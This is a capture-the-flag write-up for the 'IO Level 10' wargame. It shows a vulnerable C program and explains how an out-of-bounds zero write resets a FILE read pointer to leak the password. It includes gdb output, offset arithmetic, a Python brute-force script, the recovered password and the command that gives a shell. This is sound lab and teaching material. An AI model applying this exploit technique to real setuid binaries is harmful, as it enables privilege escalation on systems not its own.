# IO Level 10

## Problem
This problem has a fairly small code.
````
//written by andersonc0d3
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv){
        FILE *fp = fopen("/levels/level10_alt.pass", "r");
        struct {char pass[20], msg_err[20]} pwfile = {{0}};
        char ptr[0];

        if(!fp || argc != 2)
                return -1;

        fread(pwfile.pass, 1, 20, fp);
    pwfile.pass[19] = 0;
        ptr[atoi(argv[1])] = 0;
        fread(pwfile.msg_err, 1, 19, fp);
        fclose(fp);

        if(!strcmp(pwfile.pass, argv[1]))
                execl("/bin/sh", "sh", 0);
        else
                puts(pwfile.msg_err);


        return 0;
}
````

## Writeup

This program opens a "secret" file and reads the password. It also takes a command line argument and compares it with the password that is read. If they both match, a shell is 
given. However, there is no access to read the password file directly as it is set to elevated permission. 
The program also reads the next few bytes from the same file which is supposed to be the "error message". If the passwords dont match, the program then prints out the error message.
Also, there is a statement `ptr[atoi(argv[1])] = 0;` which sets the byte at (ptr + argv[1]) to zero. This is done after the first read from the password file. 

At this point, one can figure out that since there are reads happening on the same file, and this out-of-the-place statement is setting a byte to zero and dependant on the 
command line argument, there is a way to reset the read pointer of the file. If the pointer is reset, when there is a second read into the `msg_err` buffer, it reads the password
instead of the error message.

On opening this binary in gdb, and examining the structure of `FILE`:

````
(gdb) p *fp
$27 = {_flags = -72539000, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0,
  _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0xb7fcf580, _fileno = 7, _flags2 = 0, _old_offset = 0, _cur_column = 0,
  _vtable_offset = 0 '\000', _shortbuf = "", _lock = 0x804a0a0, _offset = -1, __pad1 = 0x0, __pad2 = 0x804a0ac, __pad3 = 0x0, __pad4 = 0x0, __pad5 = 0, _mode = 0,
  _unused2 = '\000' <repeats 39 times>}
(gdb)
````

There is a pointer called `_IO_read_ptr` which is initially 0.
This program cant be debugged directly in gdb because opening this in gdb would render the elevated password file inaccessible. One way is to compile this binary at a temporary
location and creating a password file on our own. On running the gdb on the temporary program and checking the `FILE` fter doing the read,

````
(gdb) p *fp
$28 = {_flags = -72539000, _IO_read_ptr = 0xb7fde014 "aaaaaaaaaabbbbbbbbbb\n", _IO_read_end = 0xb7fde029 "", _IO_read_base = 0xb7fde000 "01234567890123456789aaaaaaaaaabbbbbbbbbb\n",
  _IO_write_base = 0xb7fde000 "01234567890123456789aaaaaaaaaabbbbbbbbbb\n", _IO_write_ptr = 0xb7fde000 "01234567890123456789aaaaaaaaaabbbbbbbbbb\n",
  _IO_write_end = 0xb7fde000 "01234567890123456789aaaaaaaaaabbbbbbbbbb\n", _IO_buf_base = 0xb7fde000 "01234567890123456789aaaaaaaaaabbbbbbbbbb\n",
  _IO_buf_end = 0xb7fdf000 "d\360\375\267\323\300\377\267", _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0xb7fcf580, _fileno = 7, _flags2 = 0,
  _old_offset = 0, _cur_column = 0, _vtable_offset = 0 '\000', _shortbuf = "", _lock = 0x804a0a0, _offset = -1, __pad1 = 0x0, __pad2 = 0x804a0ac, __pad3 = 0x0, __pad4 = 0x0, __pad5 = 0,
  _mode = -1, _unused2 = '\000' <repeats 39 times>}
(gdb)
````

Note that the _IO_read_ptr is now pointing to the location after the password is read and this has to be reset to the beginning. On printing the address of this pointer in memory
and the address of `ptr` variable which allows us to set an "arbitrary" byte to 0
````
p &fp._IO_read_ptr
$29 = (char **) 0x804a00c
p &ptr
$30 = (char (*)[]) 0xbffffc74
````
So the difference would be 
````
p (int)&ptr - (int)&fp._IO_read_ptr
$31 = -1208263576
```` 

So if I pass 1208263576 as the argument, it sets the first byte of value pointed to by fp._IO_read_ptr to 0. Since there were only 20 bytes read, setting the first byte to zero 
would reset the pointer. However, it wont set the required byte to zero adn fread still reads the "error message" into the `msg_err` buffer.

Note that the address of pointer `ptr` depends on the length of command line argument since the command line argument is stored on the stack. On performing the same calculations with
the new argument obtained above (1208263576)

````
p (int)&ptr - (int)&fp._IO_read_ptr
$40 = -1208263592
````

Thus the new argument is 1208263592. This argument resets the read pointer and causes the password to be printed out as error message.

However, on running this on the original binary, the offsets vary. One method is to brute force the program with different values around the values obtained in gdb. The 
python script described below does that.

````
#!/usr/bin/env python
import subprocess
import sys

start = 1208260000
end = 1208270000
for i in range(start, end):
    try:
        output = subprocess.check_output(["/levels//level10", str(i)], stderr=None)
    except Exception:
        continue
    if output.find("ACCESS") == -1:
        print i
````

This find the value to be "1208263612". Hence on running,
` /levels/level10 1208263612`
the password that is supposed to be input is obtained.
"AverYloNgPassword!!"
**This is then passed to the binary using
`/levels/level10 `python -c 'print "AverYloNgPassword!!"'`
and the shell is obtained.**

